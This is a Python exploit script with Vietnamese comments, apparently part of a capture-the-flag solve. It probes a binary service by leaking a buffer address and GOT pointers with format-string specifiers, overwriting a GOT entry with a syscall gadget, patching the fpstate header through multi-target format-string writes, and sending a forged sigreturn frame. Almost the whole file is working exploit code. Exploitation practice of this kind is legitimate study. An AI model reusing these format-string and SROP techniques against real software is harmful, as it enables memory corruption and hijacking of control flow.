#!/usr/bin/env python3
"""Thu SROP voi nhieu bien the cho fpstate header.

Moi lan chay = 1 ket noi. Ket luan:
  - ket noi CHET ngay sau 15 byte  -> rt_sigreturn chap nhan (RIP/RSP bi lan)
  - ket noi CON song, in 'score> ' -> rt_sigreturn bi tu choic
"""
import re
import sys
import time

sys.path.insert(0, ".")
sys.path.insert(0, "..")
from probe import Renderer
from exploit import q, leak_ptr, find_syscall_gadget, spec_write, GOT, N_FRAMESZ


def multi_write(pairs):
    """Mot template thuc hien nhieu phep ghi 8 byte. %<n>$w: *[buf+8*(n-6)] = buf+8*(n-5)."""
    w = len(pairs)
    off = 16
    for _ in range(40):
        first = 6 + off // 8
        spec = b"".join(b"%%%d$w" % (first + i) for i in range(w))
        new = max(16, ((len(spec) + 1 + 7) // 8) * 8)
        if new == off:
            break
        off = new
    total = off + 16 * w
    assert total <= 511, f"{w} phep ghi can {total} byte"
    p = bytearray(b"." * total)
    p[0 : len(spec)] = spec
    p[len(spec)] = 0x0A
    for i, (addr, val) in enumerate(pairs):
        # slot cua write thu i: target o buf[8*(first+i-6)], value o buf[8*(first+i-5)]
        t = 8 * (first + i - 6)
        v = 8 * (first + i - 5)
        p[t : t + 8] = q(addr)
        p[v : v + 8] = q(val)
    return bytes(p)


def build_frame(gbase, rip, rsp, rdi=0, rsi=0, rdx=0, rax=0, extra=None):
    f = bytearray(N_FRAMESZ)

    def put(k, v):
        f[k - 8 : k] = q(v)

    put(gbase - 0x28, 0)      # uc_flags
    put(gbase - 0x20, 0)      # uc_link
    put(gbase - 0x18, 0)      # ss_sp
    put(gbase - 0x10, 2)      # ss_flags = SS_DISABLE
    put(gbase - 0x08, 0)      # ss_size
    for i in range(23):
        put(gbase + 8 * i, 0)
    put(gbase + 8 * 8, rdi)
    put(gbase + 8 * 9, rsi)
    put(gbase + 8 * 12, rdx)
    put(gbase + 8 * 13, rax)
    put(gbase + 8 * 15, rip)
    put(gbase + 8 * 16, rsp)
    for k, v in (extra or {}).items():
        put(k, v)
    assert len(f) == N_FRAMESZ
    return bytes(f)


def attempt(gbase, fpfix, tag):
    r = Renderer()
    r.drain()
    r.buf = b""
    buf = int(re.search(rb"0x([0-9a-f]+)", r.render(b"%70$p")).group(1), 16)
    wa = leak_ptr(r, GOT["write"])
    g = find_syscall_gadget(r, wa)
    r.render(spec_write(GOT["strcspn"], g))
    if fpfix:
        r.render(multi_write(fpfix(buf)), 4.0)
    # frame day: RIP/RSP = 0x401230 (`ret`) -> neu sigreturn dung thi crash
    r.s.sendall(build_frame(gbase, 0x401230, 0x401230) + b"\n")
    time.sleep(0.8)
    r.buf = b""
    try:
        r._read(1.0)
    except Exception:
        pass
    try:
        r.s.sendall(b"\x00" * 15)
        time.sleep(1.0)
        out = r._read(2.0)
    except Exception as e:
        print(f"[{tag}] ket noi CHET -> rt_sigreturn DUOC chap nhan  ({type(e).__name__})")
        r.close()
        return True
    alive = b"score>" in out
    print(f"[{tag}] {'CONG SON (sigreturn bi tu choi)' if alive else 'DU LIEU LA'}: {out[:60]!r}")
    r.close()
    return not alive


MAGIC1 = 0x5346584D
if __name__ == "__main__":
    # fpstate nam tai frame+0x170 = buf+0x168; header xfeatures tai fpstate+0x1a0
    FS = 0x168
    variants = {
        "gbase=0x30 khong sua fpstate": (0x30, None),
        "gbase=0x30 zero header": (0x30, lambda b: [(b + FS + 0x1A0, 0), (b + FS + 0x1A8, 0)] + [(b + FS + 0x1B0 + 8 * i, 0) for i in range(6)]),
        "gbase=0x30 xf=3 xcomp=0": (0x30, lambda b: [(b + FS + 0x1A0, 3), (b + FS + 0x1A8, 0)] + [(b + FS + 0x1B0 + 8 * i, 0) for i in range(6)] + [(b + FS + 0x18, 0x1F80)]),
        "gbase=0x30 xf=3 compacted": (0x30, lambda b: [(b + FS + 0x1A0, 3), (b + FS + 0x1A8, 1 << 62)] + [(b + FS + 0x1B0 + 8 * i, 0) for i in range(6)] + [(b + FS + 0x18, 0x1F80)]),
        "gbase=0xb0 zero header": (0xB0, lambda b: [(b + 0x240 + 0x1A0, 0), (b + 0x240 + 0x1A8, 0)]),
    }
    for tag, (gb, fx) in variants.items():
        try:
            if attempt(gb, fx, tag):
                print("[+] ->", tag)
                break
        except Exception as e:
            print(f"[{tag}] LOI {type(e).__name__}: {e}")
